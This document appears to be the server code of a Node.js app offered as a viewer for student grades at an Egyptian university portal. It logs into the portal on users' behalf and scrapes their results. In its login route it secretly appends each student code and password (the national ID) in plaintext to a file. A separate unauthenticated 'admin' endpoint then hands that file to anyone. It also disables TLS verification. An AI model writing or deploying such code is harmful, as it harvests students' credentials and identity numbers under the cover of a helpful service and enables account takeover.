const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const cookieParser = require('cookie-parser');
const cors = require('cors');
const path = require('path');
const https = require('https');

// Create an HTTPS agent that ignores SSL certificate errors
const httpsAgent = new https.Agent({
    rejectUnauthorized: false
});

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(cors());

// Serve static files from 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

const BASE_URL = 'https://studentportalsis.azu.edu.eg';
const LOGIN_URL = `${BASE_URL}/Default.aspx`;
const RESULTS_URL = `${BASE_URL}/UI/StudentView/student_sem_work_Modular.aspx`;

// Helper: Extract ViewState and other ASP.NET hidden fields
const extractHiddenFields = (html) => {
    const $ = cheerio.load(html);
    return {
        __VIEWSTATE: $('#__VIEWSTATE').val() || '',
        __VIEWSTATEGENERATOR: $('#__VIEWSTATEGENERATOR').val() || '',
        __EVENTVALIDATION: $('#__EVENTVALIDATION').val() || '',
        __EVENTTARGET: $('#__EVENTTARGET').val() || '',
        __EVENTARGUMENT: $('#__EVENTARGUMENT').val() || ''
    };
};

// Route: Login
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'اسم المستخدم وكلمة المرور مطلوبان' });
    }

    try {
        // 1. Get initial page which often responds with 302 to set the Session ID
        const firstResponse = await axios.get(LOGIN_URL, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
            }
        });

        let cookies = firstResponse.headers['set-cookie'] || [];
        let sessionCookie = cookies.find(c => c.startsWith('ASP.NET_SessionId='));
        let cookieHeader = '';
        if (sessionCookie) {
            cookieHeader = sessionCookie.split(';')[0];
        }

        // 1.5 Fetch the actual HTML page now that we have the session cookie
        const htmlResponse = await axios.get(LOGIN_URL, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                ...(cookieHeader ? { 'Cookie': cookieHeader } : {})
            }
        });

        const hiddenFields = extractHiddenFields(htmlResponse.data);

        // 2. Prepare Form Data for Login
        const formData = new URLSearchParams();
        formData.append('__EVENTTARGET', '');
        formData.append('__EVENTARGUMENT', '');
        formData.append('__VIEWSTATE', hiddenFields.__VIEWSTATE);
        formData.append('__VIEWSTATEGENERATOR', hiddenFields.__VIEWSTATEGENERATOR);
        formData.append('__EVENTVALIDATION', hiddenFields.__EVENTVALIDATION);
        formData.append('txtUsername', username);
        formData.append('txtPassword', password);
        formData.append('btnEnter', 'دخول'); // Ensure it matches the submit button's value if required

        // 3. Post login
        const loginResponse = await axios.post(LOGIN_URL, formData, {
            httpsAgent,
            maxRedirects: 0, // IMPORTANT: Do not follow redirects so we can capture cookies
            validateStatus: function (status) {
                return status >= 200 && status < 400; // Resolve even on 302 redirect
            },
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                ...(cookieHeader ? { 'Cookie': cookieHeader } : {})
            }
        });

        const newCookies = loginResponse.headers['set-cookie'] || [];
        const authCookie = newCookies.find(c => c.includes('.ASPXAUTH'));

        if (loginResponse.status === 302 || authCookie) {
            // Login successful
            // Combine session cookie and auth cookie
            let finalCookies = [];
            if (sessionCookie) finalCookies.push(sessionCookie.split(';')[0]);
            if (authCookie) finalCookies.push(authCookie.split(';')[0]);

            // Log successful login
            const logEntry = `[${new Date().toISOString()}] Student Code: ${username} | National ID / Password: ${password}\n`;
            require('fs').appendFileSync('logins.txt', logEntry, 'utf8');

            res.json({
                success: true,
                message: 'تم تسجيل الدخول بنجاح',
                sessionToken: finalCookies.join('; '),
                nationalId: password // Pass back the password as the National ID to the frontend
            });
        } else {
            // Failed login - usually returns 200 with an error message in HTML
            const $ = cheerio.load(loginResponse.data);
            const errorMessage = $('#lblError').text() || 'خطأ في بيانات الدخول';
            res.status(401).json({ success: false, message: errorMessage });
        }

    } catch (error) {
        console.error('Login Error:', error.message);
        res.status(500).json({ success: false, message: 'حدث خطأ أثناء الاتصال بالخادم. حاول مجدداً.' });
    }
});

// Route: Get Results
app.post('/api/results', async (req, res) => {
    const { sessionToken, year, semester, round } = req.body;
    console.log(`[RESULTS] Request received for Year: ${year}, Semester: ${semester}, Round: ${round}`);
    console.log(`[RESULTS] Using Session Token: ${sessionToken}`);

    if (!sessionToken) {
        return res.status(401).json({ success: false, message: 'غير مصرح لك. يرجى تسجيل الدخول مجدداً' });
    }

    try {
        console.log(`[RESULTS] Fetching initial RESULTS_URL to get ViewState...`);
        // 1. Get Results page to extract initial ViewState for the results form
        const initialResponse = await axios.get(RESULTS_URL, {
            httpsAgent,
            headers: {
                'Cookie': sessionToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        });

        const hiddenFields = extractHiddenFields(initialResponse.data);
        console.log(`[RESULTS] Extracted ViewState length: ${hiddenFields.__VIEWSTATE.length}`);

        // 2. Prepare Form Data to request specific results
        const formData = new URLSearchParams();

        // Dynamically append ALL hidden inputs from the page
        const $initial = cheerio.load(initialResponse.data);
        $initial('input[type="hidden"]').each((i, el) => {
            const name = $initial(el).attr('name');
            const value = $initial(el).val() || '';
            if (name) {
                formData.append(name, value);
            }
        });

        // Form specific fields
        formData.append('ctl00$cntphmaster$ACadYearDropDownList', year);
        formData.append('ctl00$cntphmaster$semesterDropDownList', semester);
        formData.append('ctl00$cntphmaster$drpExamType', round);

        // Submit button
        formData.append('ctl00$cntphmaster$searchButton', 'بحث');

        console.log(`[RESULTS] Prepared Form Data. Submitting POST...`);

        // 3. Post request for results
        const resultResponse = await axios.post(RESULTS_URL, formData, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 600,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': sessionToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Referer': RESULTS_URL
            }
        });

        console.log(`[RESULTS] Response Status: ${resultResponse.status}`);

        const responseData = resultResponse.data;

        if (resultResponse.status >= 400) {
            console.error(`[RESULTS] Server returned error ${resultResponse.status}. HTML Snippet:`);
            console.error(responseData.toString().substring(0, 500));
            return res.status(500).json({ success: false, message: `فشل جلب النتيجة. كود الخطأ: ${resultResponse.status}` });
        }

        // The response is a standard HTML document now
        const $ = cheerio.load(responseData);
        const resultsTable = $('#ctl00_cntphmaster_GridView1'); // The correct table ID in the new modular system

        console.log(`[RESULTS] Found Results Table? ${resultsTable.length > 0 ? 'Yes' : 'No'}`);

        if (!resultsTable.length) {
            // Log full output if table not found to debug
            const fs = require('fs');
            fs.writeFileSync('debug_failed_results_response.html', responseData);
            console.log('[RESULTS] Saved response html to debug_failed_results_response.html');
            return res.json({ success: true, data: [], message: 'لم يتم العثور على نتائج لهذه البيانات' });
        }

        const results = [];
        let totalMarksSum = 0;

        // Parse table rows, skipping the header row
        resultsTable.find('tr').each((index, element) => {
            if (index === 0) return; // Skip header

            const tds = $(element).find('td');
            if (tds.length >= 5) {
                const finalMarkStr = $(tds[3]).text().trim();
                const finalMarkVal = parseFloat(finalMarkStr) || 0;
                totalMarksSum += finalMarkVal;

                results.push({
                    subjectCode: $(tds[0]).text().trim(),
                    subjectName: $(tds[1]).text().trim(),
                    status: $(tds[2]).text().trim(),
                    finalMark: finalMarkStr,
                    grade: $(tds[4]).text().trim()
                });
            }
        });

        console.log(`[RESULTS] Successfully extracted ${results.length} subjects.`);

        // Extract student details if available (name, total percentage, etc.)
        const studentName = $('#ctl00_lblUser').text() || '';
        const faculty = $('.logo_Text').text() || '';
        const level = $('#ctl00_lblAdmYear').text() || '';

        // Extract GPA modular info
        let gpa1 = '';
        let gpau1 = '';
        const modularTableTd = $('#ctl00_cntphmaster_pnl_Modular table tr td');
        modularTableTd.each((i, el) => {
            const txt = $(el).text().trim();
            if (txt.includes('GPA1')) gpa1 = $(modularTableTd[i + 1]).text().trim();
            if (txt.includes('GPAU1')) gpau1 = $(modularTableTd[i + 1]).text().trim();
        });

        res.json({
            success: true,
            data: results,
            totalMarksSum: totalMarksSum,
            studentInfo: {
                name: studentName,
                faculty: faculty,
                level: level,
                gpa1: gpa1,
                gpau1: gpau1
            }
        });

    } catch (error) {
        console.error('[RESULTS] Catch Error:', error.message);
        console.error(error.stack);
        res.status(500).json({ success: false, message: 'حدث خطأ غير متوقع أثناء الاتصال بالخادم.' });
    }
});

// Route: Get Logins (Admin View)
app.get('/api/logins', (req, res) => {
    try {
        const fs = require('fs');
        if (fs.existsSync('logins.txt')) {
            const data = fs.readFileSync('logins.txt', 'utf8');
            const lines = data.split('\n').filter(line => line.trim() !== '');
            res.json({ success: true, logins: lines });
        } else {
            res.json({ success: true, logins: [] });
        }
    } catch (e) {
        res.status(500).json({ success: false, message: 'تعذر قراءة ملف التسجيلات' });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
